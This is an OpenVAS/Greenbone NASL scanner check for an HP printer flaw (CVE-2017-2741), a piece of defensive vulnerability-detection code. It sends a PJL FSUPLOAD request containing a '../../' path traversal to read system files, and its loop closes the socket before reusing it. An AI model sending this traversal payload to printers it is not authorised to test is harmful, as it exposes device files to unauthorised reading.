# SPDX-FileCopyrightText: 2017 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.106920");
  script_version("2025-09-12T05:38:45+0000");
  script_tag(name:"last_modification", value:"2025-09-12 05:38:45 +0000 (Fri, 12 Sep 2025)");
  script_tag(name:"creation_date", value:"2017-07-05 09:03:32 +0700 (Wed, 05 Jul 2017)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2017-2741");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("HP Printers Arbitrary Code Execution Vulnerability (HPSBPI03555) - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2017 Greenbone AG");
  script_family("Remote file access");
  script_dependencies("gb_pcl_pjl_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/hp-pjl", 9100);
  script_require_keys("Host/runs_unixoide");
  # nb: Don't add a script_mandatory_keys from e.g. pjl_detect.nasl
  # as some HP printers doesn't answer to the PJL probe request.

  script_tag(name:"summary", value:"A potential security vulnerability has been identified with
  certain HP printers. This vulnerability could potentially be exploited to execute arbitrary
  code.");

  script_tag(name:"vuldetect", value:"Sends a crafted PJL request and checks the response.");

  script_tag(name:"affected", value:"HP PageWide Printers and HP OfficeJet Pro Printers.");

  script_tag(name:"solution", value:"HP has provided firmware updates for impacted printers. See the
  referenced advisory for further details.");

  script_xref(name:"URL", value:"https://support.hp.com/si-en/document/ish_10357502-10357901-16/hpsbpi03555");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("traversal_func.inc");
include("string_hex_func.inc");
include("port_service_func.inc");

port = get_kb_item("Services/hp-pjl");
if (!port) {
  port = 9100;
  not_in_kb = TRUE;
}

if (!get_port_state(port))
  exit(0);

files = traversal_files("linux");

# PJL ports get the Hex banner set to "aeaeaeaeae" in pcl_pjl_register_all_ports()
if (hexstr(unknown_banner_get(port: port, dontfetch: TRUE)) == "aeaeaeaeae" || not_in_kb) {
  soc = open_sock_tcp(port);
  if (!soc)
    exit(0);

  foreach pattern(keys(files)) {

    file = files[pattern];

    send(socket: soc, data: '\x1b%-12345X@PJL FSUPLOAD NAME="../../' + file + '" OFFSET=0 SIZE=648\r\n\x1b%-12345X\r\n');
    res = recv(socket: soc, length: 1024);
    close(soc);

    if (egrep(string: res, pattern: pattern, icase: TRUE)) {
      report = "It was possible to obtain the /" + file + " file.\n\n" + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }
}

exit(99);
